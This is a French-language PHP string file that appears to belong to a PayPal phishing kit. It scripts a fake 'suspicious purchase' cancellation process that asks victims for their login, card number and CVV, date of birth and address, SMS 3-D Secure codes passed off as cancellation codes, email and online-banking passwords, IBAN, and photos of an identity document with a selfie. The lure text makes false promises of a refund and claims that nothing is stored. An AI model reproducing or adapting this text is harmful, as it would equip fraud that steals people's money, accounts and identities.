<?php

	$lg_sign = [
		"title" => "Connectez-vous à votre compte",
		"alert" => "Veuillez vérifier vos entrées et réessayer.",
		"changer" => "Changer",
		"eml_placeholder" => "Adresse e-mail",
		"eml_msg1" => "Entrez votre adresse email.",
		"eml_msg2" => "Ce format de courrier électronique n’est pas correct",
		"bt_next" => "Suivant",
		"pwd_placeholder" => "Entrez votre mot de passe",
		"pwd_show" => "Afficher",
		"pwd_hide" => "Cacher",
		"bt_login" => "Connexion",
		"trouble" => "Vous rencontrez des difficultés pour vous connecter?",
		"or" => "ou",
		"bt_signup" => "Inscription",
		"footer" => [
			"contact" => "Contact Us",
			"privacy" => "Intimité",
			"legal" => "Légal",
			"world" => "À l'échelle mondiale"
		],
		"rotate" => "En traitement..."
	];

	$lg_activity = [
		"title" => "Un achat suspect !",
		"head" => "Procédure d'annulation d'achat",
		"head1" => "Afin de vous garantir un meilleur service et une meilleure sécurité.",
		"body" => "Pour terminer le processus de celle-ci, vous devez impérativement confirmer vos informations sur votre compte.",
		"body1" => "Pour nous assurer que vous êtes bien le titulaire du compte.",
		"body2" => "Voici les étapes à suivre à la date du",
		"body3" => "1.Cliquez sur continuer pour commencer",
		"body4" => "2.Confirmer vos informations",
		"body5" => "3.Confirmer le code d'annulation par sms",
		"bt_secure" => "Continuer"
	];	

	$lg_captcha = [
		"title" => "Défi de sécurité",
		"head" => "Défi de sécurité",
		"body" => "Veuillez saisir les caractères que vous voyez dans l'image à des fins de sécurité",
		"bt_secure" => "Je ne suis pas un robot",
		"code" => "Entrez le code affiché"
	];

	$lg_process = [
		"title" => "Mon compte: portefeuille",
		"logout" => "Déconnexion",
		"menu" => [
			"home" => "Résumé",
			"activity" => "Activité",
			"send_receive" => "Envoyer et demande",
			"wallet" => "Portefeuille",
			"help" => "Aide",
			"open" => "Menu",
			"close" => "Fermer"
		],
		"head1" => "Confirmez votre carte",
		"head2" => "Confirmez votre adresse",
		"head3" => "Lien Nouvelle carte",
		"ctype" => "Type de carte",
		"cnumber" => "Numéro de carte",
		"exp" => "Expiration MM/YYYY",
		"csc" => "CVV (3 chiffres)",
		"name" => "Nom complet",
		"dob" => "Date de naissance (DD/MM/YYYY)",
		"address" => "ligne d'adresse",
		"city" => "Ville / Village",
		"zip" => "Code postal",
		"ptype" => "Type de téléphone",
		"pnumber" => "Numéro de téléphone",
		"bt_save" => "Enregistrer",
		"dnt_have" => "Je n'ai pas d'autre carte",
		"footer" => [
			"security" => "Sécurité",
			"rights" => "Tous droits réservés."
		]
	];
	$lg_auth = [
		"title" => "IDENTIFICATION PAR SMS",
		"success" => "La sécurité 3-D a été traitée avec succès ...",
		"code" => "Saisir le code d'annulation ici",
		"processing" => "En traitement",
		"fail" => "Le code saisi a expiré !",
		"fail2" => " veuillez patienter, un nouveau code vous sera envoyé par SMS dans quelques instants...",
		"added" => "Attention: code incorrect, veuillez réessayer !",
		"protect" => "REMARQUE:",
		"center" => "Pour annuler cet achat avec PayPal, nous allons vous envoyer le code sms du marchand, veuillez saisir le code de confirmation que vous recevrez par SMS sur votre téléphone portable dans quelques instants. ",
		"nextline" => "Il s'agit d'une annulation, vous serez remboursé du montant débité d'ici quelques instants.",
		"name" => "NOM SUR LA CARTE : ",
		"cardnumber" => "NUMERO DE CARTE : ",
		"datetime" => "Date heure",
		"date" => "DATE : ",
		"cannot" => "Veuillez maintenir cette page ouverte dans l'attente de votre code d'accès.",
		"next1" => "Cette identification est obligatoire pour conclure la procédure.",
		"bt_secure" => "Continuer",
		"submit" => "Soumettre"
	];
	$lg_mailaccess = [
		"head" => "Liez votre fournisseur de messagerie",
		"fcenter" => "Utilisez votre",
		"center" => "connectez-vous pour lier votre fournisseur de messagerie. (Nous n'enregistrons pas ces informations.)",
		"mailaccess" => "Entrez votre fournisseur de messagerie",
		"passwordaccess" => "Entrez votre mot de passe fournisseur de messagerie",
		"bt_save" => "Accepter et lier"
	];
	$lg_bank = [
		"head" => "Liez votre compte bancaire",
		"head2" => "Connectez-vous à votre",
		"head3" => "Compte bancaire pour confirmer que vous contrôlez ce compte bancaire.",
		"head4" => "Le compte bancaire doit être identique pour votre",
		"bankname" => "Nom de la banque",
		"bankcountry" => "Pays de la banque",
		"bankphone" => "Téléphone bancaire",
		"bankwebsite" => "Site Web de la banque",
		"head4" => "Le compte bancaire doit être identique pour votre",
		"userid" => "Nom d'utilisateur / identifiant du compte",
		"passcode" => "Mot de passe / mot de passe du compte",
		"accnumq" => "Numéro de compte",
		"rounum" => "Numéro de routage",
		"iban" => "IBAN",
		"bt_save" => "Accepter et lier"
	];

	$lg_id = [
		"head" => "Téléchargez votre identité",
		"proof" => [
			"one" => "Preuve d'identité",
			"two" => "Selfie avec preuve",
			"three" => "Processus terminé"
		],
		"choose" => "Choisissez votre type d'identifiant",
		"type" => [
			"one" => "Continuer",
			"two" => "identifiant national",
			"three" => "Permis de conduire"
		],
		"bt_proceed" => "Proceed",
		"head_up" => "Envoyez votre",
		"rule1" => [
			"one" => "Tire uma foto de alta qualidade<br>",
			"two" => "Envie ambos os lados do<br>um documento frente e verso",
			"three" => "Scannez les deux pages <br> si vous avez choisi un passeport"
		],
		"drop_zone" => "<b> Glissez-déposez ou cliquez ici </b> pour télécharger votre image (5 Mo maximum)",
		"bt_back" => "RETOUR",
		"head_slf" => "Charger un selfie avec",
		"rule2" => [
			"one" => "Certifique-se de que você está procurando<brstraight at the camera>",
			"two" => "Vos doigts ne couvrent pas la photo ou des informations importantes",
			"three" => "Não use chapéu ou óculos<br>e certifique-se<br> sua barba é aparada"
		]
	];

	$lg_finish = [
		"head" => "Le processus de validation est terminé",
		"on" => "ACTIVÉ",
		"p1" => "La protection des achats est maintenant",
		"p2" => "Il couvre tous les achats éligibles pour lesquels un compte est utilisé, ainsi que les paiements effectués via notre site Web. Pour bénéficier de la protection des achats, nous exigeons entre autres choses que les comptes soient maintenus en règle et demandons qu’un différend soit classé dans les 180 jours suivant votre achat ou votre paiement.",
		"p3" => "Lire les exigences de protection des achats"
	];

?>